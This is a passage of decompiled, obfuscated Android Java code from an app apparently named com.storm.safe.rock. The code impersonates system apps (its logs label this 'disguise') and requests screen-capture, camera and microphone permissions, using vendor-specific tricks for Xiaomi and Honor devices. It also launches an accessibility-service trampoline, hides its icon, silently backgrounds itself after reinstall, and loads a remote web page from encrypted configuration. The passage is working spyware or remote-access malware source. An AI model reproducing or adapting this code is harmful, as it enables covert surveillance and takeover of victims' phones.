                for (String str3 : AbstractC0716jf.m213306g5("com.hihonor.systemmanager", StringUtil.m212470a0("KFYcdEU3AiFFfzhAAi5INQEvWTAsXAM="), StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), StringUtil.m212470a0("KFYcdEU3AiFFfztRHjRIKwk8QTgoXA=="), StringUtil.m212470a0("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo"), StringUtil.m212470a0("KFYcdE43ACFFPjgXAj9OLR4nQygsTBAoSQ=="), StringUtil.m212470a0("KFYcdEIoHCEZIipfFA=="), StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), StringUtil.m212470a0("KFYcdFsxGiEZMClc"), StringUtil.m212470a0("KFYcdFsxGiEZIi5aBChELBU="), StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="))) {
                    try {
                    } catch (PackageManager.NameNotFoundException unused) {
                    } catch (Exception e2) {
                        t60.m214726f4("iuzxujjtqev", "⚠️ [伪装] 检查包出错: " + e2.getMessage());
                    }
                    if (getPackageManager().getPackageInfo(str3, 0) != null && (launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str3)) != null) {
                        launchIntentForPackage.addFlags(1350631424);
                        startActivity(launchIntentForPackage);
                        new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 8), 100L);
                        return;
                    }
                }
                t60.m214726f4("iuzxujjtqev", "⚠️ [伪装] 未找到目标应用，关闭");
                finish();
                overridePendingTransition(0, 0);
                return;
            }
            if (m211217c7()) {
                return;
            }
            finish();
            overridePendingTransition(0, 0);
        } catch (Exception e3) {
            t60.m214705c6("iuzxujjtqev", "❌ 跳转失败", e3);
            finish();
            overridePendingTransition(0, 0);
        }
    }

    /* renamed from: c9 */
    public final void m211219c9() {
        try {
            getSharedPreferences(StringUtil.m212470a0("O1wDN0QrHydYPxRLFCtYPR86"), 0).edit().putBoolean("is_requesting", false).apply();
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 标记权限申请状态失败", e);
        }
    }

    /* renamed from: d0 */
    public final void m211220d0() {
        try {
            Integer num = AbstractC0241a0.f51907a1;
            if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) == null) {
                Intent intent = new Intent("com.storm.safe.rock.intent.PERMISSION_REQUEST");
                intent.putExtra("permission_type", "media_projection");
                intent.putExtra("requesting", true);
                sendBroadcast(intent);
                return;
            }
            boolean booleanExtra = getIntent().getBooleanExtra("ANDROID_15_RECOVERY", false);
            boolean booleanExtra2 = getIntent().getBooleanExtra("PERMISSION_LOST_RECOVERY", false);
            if (!booleanExtra && !booleanExtra2) {
                sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
                return;
            }
            Intent intent2 = new Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED");
            intent2.putExtra(PollingXHR.Request.EVENT_SUCCESS, true);
            intent2.putExtra("permission_recovery", true);
            sendBroadcast(intent2);
            runOnUiThread(new dk1(this, 21));
            new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 22), 2000L);
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 通知无障碍服务失败", e);
        }
    }

    /* renamed from: d1 */
    public final void m211221d1() {
        try {
            Intent intent = new Intent(this, (Class<?>) AccessibilityTrampoline.class);
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "AccessibilityTrampoline launch failed", e);
        }
        finish();
    }

    /* renamed from: d2 */
    public final void m211222d2() {
        try {
            if (checkSelfPermission("android.permission.CAMERA") != 0) {
                requestPermissions(new String[]{"android.permission.CAMERA"}, 1009);
            } else {
                runOnUiThread(new dk1(this, 17));
                new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 18), 2000L);
            }
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "申请摄像头权限失败", e);
            runOnUiThread(new dk1(this, 19));
        }
    }

    /* renamed from: d3 */
    public final void m211223d3() {
        try {
            runOnUiThread(new bk1(this, 17));
            getWindow().clearFlags(16);
            new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 18), 500L);
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ MIUI内置权限申请方法失败", e);
            m211227d7();
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:21:0x0081  */
    /* renamed from: d4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211224d4() {
        boolean z;
        try {
            String str = Build.MANUFACTURER;
            String str2 = Build.MODEL;
            int i = Build.VERSION.SDK_INT;
            t60.m214714d6("iuzxujjtqev", "✅ [设备] " + str + " " + str2 + " (API " + i + ")");
            if (i >= 30) {
                runOnUiThread(new dk1(this, 13));
                new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 14), 1000L);
                return;
            }
            if (AbstractC0779a1.m213656a9(str, "Xiaomi") || AbstractC0779a1.m213656a9(str, "Redmi")) {
                z = true;
            } else {
                String str3 = Build.BRAND;
                if (!AbstractC0779a1.m213656a9(str3, "Xiaomi") && !AbstractC0779a1.m213656a9(str3, "Redmi") && !AbstractC0779a1.m213656a9(str3, "POCO")) {
                    z = false;
                }
            }
            if (z && i == 29) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 小米Android10设备可能存在弹窗问题");
            }
            if (this.f51964c9 == null) {
                t60.m214704c5("iuzxujjtqev", "❌ MediaProjectionManager未初始化，重新初始化");
                Object systemService = getSystemService("media_projection");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
                this.f51964c9 = (MediaProjectionManager) systemService;
            }
            m211220d0();
            if (z && i == 29) {
                m211225d5();
                return;
            }
            MediaProjectionManager mediaProjectionManager = this.f51964c9;
            Intent intentCreateScreenCaptureIntent = mediaProjectionManager != null ? mediaProjectionManager.createScreenCaptureIntent() : null;
            if (intentCreateScreenCaptureIntent == null) {
                t60.m214704c5("iuzxujjtqev", "❌ 创建MediaProjection权限Intent失败");
                return;
            }
            try {
                if (getPackageManager().resolveActivity(intentCreateScreenCaptureIntent, 0) == null) {
                    t60.m214704c5("iuzxujjtqev", "❌ 系统无法处理权限Intent！这可能是问题根源");
                }
            } catch (Exception e) {
                t60.m214705c6("iuzxujjtqev", "❌ 检查Intent处理能力时出错", e);
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            startActivityForResult(intentCreateScreenCaptureIntent, WebSocketProtocol.CLOSE_CLIENT_GOING_AWAY);
            t60.m214714d6("iuzxujjtqev", "✅ [权限] startActivityForResult完成，耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
            m211229d9();
        } catch (Exception e2) {
            t60.m214705c6("iuzxujjtqev", "❌ 申请MediaProjection权限失败", e2);
        }
    }

    /* renamed from: d5 */
    public final void m211225d5() throws Exception {
        try {
            runOnUiThread(new dk1(this, 23));
            if (Build.VERSION.SDK_INT <= 29) {
                m211223d3();
                return;
            }
            try {
                Intent intent = new Intent(this, (Class<?>) qixvbtmo.class);
                if (getPackageManager().resolveActivity(intent, 0) == null) {
                    t60.m214704c5("iuzxujjtqev", "❌ qixvbtmo无法解析，直接使用内置方法");
                    throw new Exception("qixvbtmo无法解析");
                }
                startActivityForResult(intent, 1004);
                m211229d9();
                new Handler(Looper.getMainLooper()).postDelayed(new dk1(this, 24), 3000L);
            } catch (Exception e) {
                t60.m214705c6("iuzxujjtqev", "❌ qixvbtmo启动异常", e);
                throw e;
            }
        } catch (Exception e2) {
            t60.m214705c6("iuzxujjtqev", "❌ MIUI qixvbtmo启动失败", e2);
            m211223d3();
        }
    }

    /* renamed from: d6 */
    public final void m211226d6() {
        try {
            if (checkSelfPermission("android.permission.RECORD_AUDIO") != 0) {
                requestPermissions(new String[]{"android.permission.RECORD_AUDIO"}, 1008);
            }
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 直接麦克风权限请求失败", e);
        }
    }

    /* renamed from: d7 */
    public final void m211227d7() {
        try {
            MediaProjectionManager mediaProjectionManager = this.f51964c9;
            Intent intentCreateScreenCaptureIntent = mediaProjectionManager != null ? mediaProjectionManager.createScreenCaptureIntent() : null;
            if (intentCreateScreenCaptureIntent == null) {
                t60.m214704c5("iuzxujjtqev", "❌ 标准权限申请失败：无法创建Intent");
            } else {
                startActivityForResult(intentCreateScreenCaptureIntent, WebSocketProtocol.CLOSE_CLIENT_GOING_AWAY);
                m211229d9();
            }
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 标准权限申请异常", e);
        }
    }

    /* renamed from: d8 */
    public final void m211228d8() {
        try {
            View viewFindViewById = findViewById(R$id.mainContent);
            if (viewFindViewById == null) {
                return;
            }
            viewFindViewById.setVisibility(0);
        } catch (Exception e) {
            tz0.m214807a7("❌ 显示提示弹窗失败: ", e.getMessage(), "iuzxujjtqev");
        }
    }

    /* renamed from: d9 */
    public final void m211229d9() {
        m211232e2();
        if (Build.VERSION.SDK_INT == 29) {
            new Handler(Looper.getMainLooper()).postDelayed(new RunnableC1053p2(10, this), 1000L);
        }
        this.f51970d5 = new Handler(Looper.getMainLooper());
        RunnableC0503fo runnableC0503fo = new RunnableC0503fo(this);
        this.f51974d9 = runnableC0503fo;
        Handler handler = this.f51970d5;
        if (handler != null) {
            handler.post(runnableC0503fo);
        }
    }

    /* renamed from: e0 */
    public final void m211230e0() {
        try {
            boolean z = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
            Intent intent = getIntent();
            boolean z2 = intent != null && intent.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false);
            if (!this.f51967d2 && z && !z2) {
                if (!m211216c6() && !m211215c5()) {
                    int i = C0329b4.f53194a6;
                }
                this.f51967d2 = true;
                m211218c8();
                return;
            }
            if (!isFinishing() && !isDestroyed()) {
                String strM212470a0 = null;
                try {
                    JSONObject jSONObjectM213605a3 = AbstractC0765ko.m213605a3(this);
                    String strOptString = jSONObjectM213605a3 != null ? jSONObjectM213605a3.optString(StringUtil.m212470a0("PFwTD180")) : null;
                    if (strOptString == null || AbstractC0779a1.m213663b6(strOptString)) {
                        t60.m214726f4("ConfigReader", "配置文件中没有webUrl或为空");
                    } else {
                        strM212470a0 = AbstractC0765ko.m213602a0(strOptString);
                    }
                } catch (Exception e) {
                    t60.m214705c6("ConfigReader", "获取webUrl失败", e);
                }
                if (strM212470a0 == null || AbstractC0779a1.m213663b6(strM212470a0)) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ 配置文件中没有webUrl，使用默认URL");
                    strM212470a0 = StringUtil.m212470a0("I00FKl5iQ2FafylYGD5Ydg8hWg==");
                }
                WebView webView = (WebView) findViewById(R$id.webView);
                if (webView == null) {
                    t60.m214704c5("iuzxujjtqev", "❌ 未找到WebView视图，无法加载页面");
                    return;
                }
                ne1 ne1Var = new ne1(this);
                ne1Var.f58512a2 = new fh0(21);
                ne1Var.m214073a0(webView);
                try {
                    View viewFindViewById = findViewById(R$id.webViewContainer);
                    if (viewFindViewById != null) {
                        viewFindViewById.setVisibility(0);
                    }
                } catch (Exception e2) {
                    t60.m214704c5("iuzxujjtqev", "❌ 显示WebView容器失败: " + e2.getMessage());
                }
                WebView webView2 = ne1Var.f58511a1;
                if (webView2 != null) {
                    webView2.setVisibility(0);
                }
                m211231e1();
                try {
                    ze1 ze1VarM209839b2 = m209839b2();
                    if (ze1VarM209839b2 != null && !ze1VarM209839b2.f61531c1) {
                        ze1VarM209839b2.f61531c1 = true;
                        ze1VarM209839b2.m215401e7(false);
                    }
                } catch (Exception unused) {
                }
                try {
                    getWindow().getDecorView().setSystemUiVisibility(PSKKeyManager.MAX_KEY_LENGTH_BYTES);
                } catch (Exception e3) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ 系统UI优化失败: " + e3.getMessage());
                }
                WebView webView3 = ne1Var.f58511a1;
                if (webView3 != null) {
                    webView3.loadUrl(strM212470a0);
                    return;
                }
                return;
            }
            t60.m214704c5("iuzxujjtqev", "❌ Activity已销毁或正在结束，无法启动WebView");
        } catch (Exception e4) {
            tz0.m214807a7("❌ 启动WebView失败: ", e4.getMessage(), "iuzxujjtqev");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:9:0x0024  */
    /* renamed from: e1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211231e1() {
        try {
            m211233e3();
            this.f51973d8 = true;
            this.f51971d6 = new Handler(Looper.getMainLooper());
            boolean z = false;
            try {
                boolean zHasWindowFocus = hasWindowFocus();
                if (!isFinishing()) {
                    boolean z2 = !isDestroyed();
                    if (zHasWindowFocus && z2) {
                        z = true;
                    }
                }
            } catch (Exception unused) {
            }
            if (z) {
                dqtvuisjd.f52358m1.setWebViewOpen(true);
            }
            hk1 hk1Var = new hk1(this);
            this.f51972d7 = hk1Var;
            Handler handler = this.f51971d6;
            if (handler != null) {
                handler.postDelayed(hk1Var, 500L);
            }
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 启动WebView状态更新失败", e);
        }
    }

    /* renamed from: e2 */
    public final void m211232e2() {
        Handler handler;
        RunnableC0503fo runnableC0503fo = this.f51974d9;
        if (runnableC0503fo != null && (handler = this.f51970d5) != null) {
            handler.removeCallbacks(runnableC0503fo);
        }
        this.f51970d5 = null;
        this.f51974d9 = null;
    }

    /* renamed from: e3 */
    public final void m211233e3() {
        try {
            this.f51973d8 = false;
            Handler handler = this.f51971d6;
            if (handler != null) {
                hk1 hk1Var = this.f51972d7;
                if (hk1Var == null) {
                    return;
                } else {
                    handler.removeCallbacks(hk1Var);
                }
            }
            this.f51971d6 = null;
            this.f51972d7 = null;
            dqtvuisjd.f52358m1.setWebViewOpen(false);
        } catch (Exception e) {
            t60.m214705c6("iuzxujjtqev", "❌ 停止WebView状态更新失败", e);
        }
    }

    /* renamed from: e4 */
    public final void m211234e4(String str, Integer num, Boolean bool) {
        if (isFinishing() || isDestroyed()) {
            t60.m214726f4("iuzxujjtqev", "⚠️ Activity已销毁，跳过按钮更新: ".concat(str));
        } else {
            runOnUiThread(new e41(this, str, num, bool, 3));
        }
    }

    /* renamed from: e5 */
    public final void m211235e5(String str, Integer num) {
        String str2;
        if (this.f51958c3 == null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ statusText未初始化，跳过updateStatusTextSafely");
            return;
        }
        try {
            WebView webView = (WebView) findViewById(R$id.webView);
            View viewFindViewById = findViewById(R$id.statusText);
            if (webView != null && webView.getVisibility() == 0 && viewFindViewById != null) {
                if (viewFindViewById.getVisibility() == 8) {
                    return;
                }
            }
        } catch (Exception unused) {
        }
        if ((!this.f51969d4 || (str2 = this.f51968d3) == null || str2.length() == 0) && !m211216c6()) {
            TextView textView = this.f51958c3;
            if (textView == null) {
                t60.m214724f2("statusText");
                throw null;
            }
            textView.setText(str);
            if (num != null) {
                int iIntValue = num.intValue();
                TextView textView2 = this.f51958c3;
                if (textView2 != null) {
                    textView2.setTextColor(getColor(iIntValue));
                } else {
                    t60.m214724f2("statusText");
                    throw null;
                }
            }
        }
    }

    /* renamed from: e6 */
    public final void m211236e6(String str, Integer num) {
        if (isFinishing() || isDestroyed()) {
            t60.m214726f4("iuzxujjtqev", "⚠️ Activity已销毁，跳过statusText更新: ".concat(str));
        } else {
            runOnUiThread(new RunnableC0029ai(this, str, num, 6));
        }
    }

    /* renamed from: e7 */
    public final void m211237e7() {
        if (this.f51962c7 == null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ serviceSwitch未初始化，跳过updateSwitchState");
            return;
        }
        boolean z = dqtvuisjd.f52358m1.isServiceRunning() && m211214c4();
        Switch r1 = this.f51962c7;
        if (r1 == null) {
            t60.m214724f2("serviceSwitch");
            throw null;
        }
        r1.setOnCheckedChangeListener(null);
        Switch r12 = this.f51962c7;
        if (r12 == null) {
            t60.m214724f2("serviceSwitch");
            throw null;
        }
        r12.setChecked(z);
        Switch r0 = this.f51962c7;
        if (r0 != null) {
            r0.setOnCheckedChangeListener(new C0585hl(this, 1));
        } else {
            t60.m214724f2("serviceSwitch");
            throw null;
        }
    }

    /* renamed from: e8 */
    public final void m211238e8() {
        if (this.f51959c4 == null) {
            t60.m214726f4("iuzxujjtqev", "⚠️ UI组件未初始化，跳过updateUI");
            return;
        }
        if (m211214c4()) {
            m211230e0();
            return;
        }
        String str = this.f51968d3;
        if (str == null || str.length() == 0) {
            TextView textView = this.f51958c3;
            if (textView == null) {
                t60.m214724f2("statusText");
                throw null;
            }
            textView.setVisibility(8);
        } else {
            TextView textView2 = this.f51958c3;
            if (textView2 == null) {
                t60.m214724f2("statusText");
                throw null;
            }
            textView2.setText(this.f51968d3);
            TextView textView3 = this.f51958c3;
            if (textView3 == null) {
                t60.m214724f2("statusText");
                throw null;
            }
            textView3.setVisibility(0);
        }
        Button button = this.f51959c4;
        if (button == null) {
            t60.m214724f2("enableButton");
            throw null;
        }
        button.setEnabled(true);
        m211237e7();
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) throws IllegalAccessException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
        super.onActivityResult(i, i2, intent);
        if (i == 1001) {
            if (i2 != -1) {
                if (i2 != 0) {
                    t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 未知resultCode: " + i2);
                } else {
                    t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 用户拒绝投屏权限");
                }
            }
            m211211c1(intent, i2);
            return;
        }
        if (i == 1002) {
            m211238e8();
            new Handler(getMainLooper()).postDelayed(new bk1(this, 2), 1000L);
            return;
        }
        if (i != 1004) {
            t60.m214726f4("iuzxujjtqev", "⚠️ [权限] 未知requestCode: " + i);
        } else {
            if (i2 != -1 || intent == null) {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] SimplePermission返回失败");
                runOnUiThread(new bk1(this, 0));
                new Handler(Looper.getMainLooper()).postDelayed(new bk1(this, 1), 1000L);
                return;
            }
            int intExtra = intent.getIntExtra("resultCode", 0);
            Intent intent2 = (Intent) intent.getParcelableExtra("resultData");
            if (intExtra == -1 && intent2 != null) {
                m211211c1(intent2, intExtra);
            } else {
                t60.m214726f4("iuzxujjtqev", "⚠️ [权限] SimplePermission权限申请失败");
                m211211c1(null, 0);
            }
        }
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public final void onBackPressed() {
        View viewFindViewById = findViewById(R$id.webViewContainer);
        if (viewFindViewById == null || viewFindViewById.getVisibility() != 0) {
            super.onBackPressed();
            return;
        }
        WebView webView = (WebView) findViewById(R$id.webView);
        if (webView == null || !webView.canGoBack()) {
            super.onBackPressed();
        } else {
            webView.goBack();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:279:0x05b4, code lost:
    
        r3 = p000.AbstractC0716jf.m213306g5("bg_accessibility.webp", "bg_accessibility.png").iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:281:0x05c4, code lost:
    
        if (r3.hasNext() == false) goto L437;
     */
    /* JADX WARN: Code restructure failed: missing block: B:283:0x05cc, code lost:
    
        r4 = getAssets().open((java.lang.String) r3.next());
     */
    /* JADX WARN: Code restructure failed: missing block: B:284:0x05d4, code lost:
    
        r0 = android.graphics.BitmapFactory.decodeStream(r4);
     */
    /* JADX WARN: Code restructure failed: missing block: B:285:0x05d8, code lost:
    
        if (r0 == null) goto L306;
     */
    /* JADX WARN: Code restructure failed: missing block: B:287:0x05e0, code lost:
    
        if (r0.getWidth() < 100) goto L306;
     */
    /* JADX WARN: Code restructure failed: missing block: B:289:0x05e6, code lost:
    
        if (r0.getHeight() < 100) goto L306;
     */
    /* JADX WARN: Code restructure failed: missing block: B:290:0x05e8, code lost:
    
        r6 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:291:0x05ea, code lost:
    
        if (r6 == null) goto L304;
     */
    /* JADX WARN: Code restructure failed: missing block: B:292:0x05ec, code lost:
    
        r6.setImageBitmap(r0);
        r0 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:293:0x05f1, code lost:
    
        if (r0 == null) goto L302;
     */
    /* JADX WARN: Code restructure failed: missing block: B:294:0x05f3, code lost:
    
        r0.setVisibility(0);
        r0 = findViewById(com.storm.safe.rock.R$id.mainContainer);
     */
    /* JADX WARN: Code restructure failed: missing block: B:295:0x05fd, code lost:
    
        if (r0 == null) goto L297;
     */
    /* JADX WARN: Code restructure failed: missing block: B:296:0x05ff, code lost:
    
        r0.setBackgroundColor(0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:298:0x0604, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:300:0x0607, code lost:
    
        p000.kj1.m213559a6(r4, null);
     */
    /* JADX WARN: Code restructure failed: missing block: B:302:0x060c, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:303:0x0611, code lost:
    
        throw null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:304:0x0612, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:305:0x0617, code lost:
    
        throw null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:307:0x0619, code lost:
    
        p000.kj1.m213559a6(r4, null);
     */
    /* JADX WARN: Code restructure failed: missing block: B:313:0x0623, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:316:0x0627, code lost:
    
        r0 = p000.t60.m214706c7(r25, "bg_accessibility", 0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:317:0x062b, code lost:
    
        if (r0 == 0) goto L342;
     */
    /* JADX WARN: Code restructure failed: missing block: B:318:0x062d, code lost:
    
        r0 = getResources().getDrawable(r0, getTheme());
     */
    /* JADX WARN: Code restructure failed: missing block: B:319:0x0639, code lost:
    
        if (r0 == null) goto L342;
     */
    /* JADX WARN: Code restructure failed: missing block: B:320:0x063b, code lost:
    
        r3 = r0.getIntrinsicWidth();
        r4 = r0.getIntrinsicHeight();
     */
    /* JADX WARN: Code restructure failed: missing block: B:321:0x0643, code lost:
    
        if (r3 <= 0) goto L331;
     */
    /* JADX WARN: Code restructure failed: missing block: B:322:0x0645, code lost:
    
        if (r4 <= 0) goto L331;
     */
    /* JADX WARN: Code restructure failed: missing block: B:324:0x0649, code lost:
    
        if (r3 < 100) goto L326;
     */
    /* JADX WARN: Code restructure failed: missing block: B:325:0x064b, code lost:
    
        if (r4 >= 100) goto L331;
     */
    /* JADX WARN: Code restructure failed: missing block: B:326:0x064d, code lost:
    
        p000.t60.m214726f4("iuzxujjtqev", "⚠️ 检测到占位符图片: bg_accessibility, 尺寸: " + r3 + "x" + r4 + "，视为无效");
        r0 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:327:0x066e, code lost:
    
        if (r0 == null) goto L329;
     */
    /* JADX WARN: Code restructure failed: missing block: B:328:0x0670, code lost:
    
        r0.setVisibility(8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:329:0x0674, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:330:0x0679, code lost:
    
        throw null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:331:0x067a, code lost:
    
        r3 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:332:0x067c, code lost:
    
        if (r3 == null) goto L340;
     */
    /* JADX WARN: Code restructure failed: missing block: B:333:0x067e, code lost:
    
        r3.setImageDrawable(r0);
        r0 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:334:0x0683, code lost:
    
        if (r0 == null) goto L338;
     */
    /* JADX WARN: Code restructure failed: missing block: B:335:0x0685, code lost:
    
        r0.setVisibility(0);
        r0 = findViewById(com.storm.safe.rock.R$id.mainContainer);
     */
    /* JADX WARN: Code restructure failed: missing block: B:336:0x068f, code lost:
    
        if (r0 == null) goto L350;
     */
    /* JADX WARN: Code restructure failed: missing block: B:337:0x0691, code lost:
    
        r0.setBackgroundColor(0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:338:0x0695, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:339:0x069a, code lost:
    
        throw null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:340:0x069b, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:341:0x06a0, code lost:
    
        throw null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:342:0x06a1, code lost:
    
        r0 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:343:0x06a3, code lost:
    
        if (r0 == null) goto L345;
     */
    /* JADX WARN: Code restructure failed: missing block: B:344:0x06a5, code lost:
    
        r0.setVisibility(8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:345:0x06a9, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:346:0x06ae, code lost:
    
        throw null;
     */
    /* JADX WARN: Code restructure failed: missing block: B:347:0x06af, code lost:
    
        p000.tz0.m214810b0("⚠️ 加载背景图失败: ", r0.getMessage(), "iuzxujjtqev");
        r0 = r25.f51963c8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:348:0x06ba, code lost:
    
        if (r0 != null) goto L349;
     */
    /* JADX WARN: Code restructure failed: missing block: B:349:0x06bc, code lost:
    
        r0.setVisibility(8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:350:0x06bf, code lost:
    
        r0 = findViewById(com.storm.safe.rock.R$id.webViewContainer);
     */
    /* JADX WARN: Code restructure failed: missing block: B:351:0x06c5, code lost:
    
        if (r0 != null) goto L353;
     */
    /* JADX WARN: Code restructure failed: missing block: B:353:0x06c8, code lost:
    
        r0.setVisibility(8);
     */
    /* JADX WARN: Code restructure failed: missing block: B:354:0x06cc, code lost:
    
        p000.t60.m214724f2(r17);
     */
    /* JADX WARN: Code restructure failed: missing block: B:355:0x06d1, code lost:
    
        throw null;
     */
    /* JADX WARN: Removed duplicated region for block: B:265:0x057b A[Catch: Exception -> 0x058e, TRY_ENTER, TRY_LEAVE, TryCatch #1 {Exception -> 0x058e, blocks: (B:261:0x0565, B:262:0x0571, B:265:0x057b, B:271:0x0592, B:273:0x0598, B:275:0x05a6, B:356:0x06d2), top: B:392:0x0565 }] */
    /* JADX WARN: Removed duplicated region for block: B:363:0x0702  */
    /* JADX WARN: Removed duplicated region for block: B:368:0x070f  */
    /* JADX WARN: Removed duplicated region for block: B:435:0x0591 A[SYNTHETIC] */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) throws Resources.NotFoundException, IOException, SecurityException {
        String className;
        boolean z;
        List<ActivityManager.AppTask> appTasks;
        String str;
        Intent intent;
        Set<String> categories;
        boolean zM211214c4;
        Iterator it;
        Drawable drawable;
        List<ActivityManager.AppTask> appTasks2;
        boolean z2;
        ComponentName componentName;
        l11.f57819a1.installSplashScreen(this);
        try {
            File file = new File("/data/local/tmp/app_setup_done.json");
            if (file.exists()) {
                SharedPreferences sharedPreferences = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0);
                if (!sharedPreferences.getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false) && new JSONObject(AbstractC1517zh.m215420f8(file)).optBoolean("setupDone", false)) {
                    sharedPreferences.edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), true).putBoolean("icon_hidden", true).apply();
                    getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).edit().putBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), true).apply();
                    this.f51976e1 = true;
                    t60.m214714d6("iuzxujjtqev", "✅ [重装恢复] 检测到适配标记，已恢复全部状态，将自动隐藏");
                }
            }
        } catch (Exception e) {
            tz0.m214810b0("⚠️ [重装恢复] 读取标记文件失败: ", e.getMessage(), "iuzxujjtqev");
        }
        Intent intent2 = getIntent();
        ComponentName component = intent2 != null ? intent2.getComponent() : null;
        if (component == null || (className = component.getClassName()) == null) {
            className = "";
        }
        boolean z3 = component != null && (AbstractC0779a1.m213652a5(className, "AppVariantE", false) || AbstractC0779a1.m213652a5(className, "AppVariantH", false) || AbstractC0779a1.m213652a5(className, "HuaweiAlias", false) || AbstractC0779a1.m213652a5(className, "AppVariantI", false) || AbstractC0779a1.m213652a5(className, "AppVariantJ", false) || AbstractC0779a1.m213652a5(className, "SettingsAlias", false) || AbstractC0779a1.m213652a5(className, "AppVariantF", false) || AbstractC0779a1.m213652a5(className, "AppVariantG", false) || AbstractC0779a1.m213652a5(className, "AppVariantK", false) || AbstractC0779a1.m213652a5(className, "AppVariantL", false) || AbstractC0779a1.m213652a5(className, "AppVariantA", false) || AbstractC0779a1.m213652a5(className, "AppVariantN", false));
        super.onCreate(bundle);
        if (this.f51976e1) {
            t60.m214714d6("iuzxujjtqev", "✅ [重装恢复] 静默重装检测到，直接隐藏不显示 UI");
            overridePendingTransition(0, 0);
            moveTaskToBack(true);
            finish();
            return;
        }
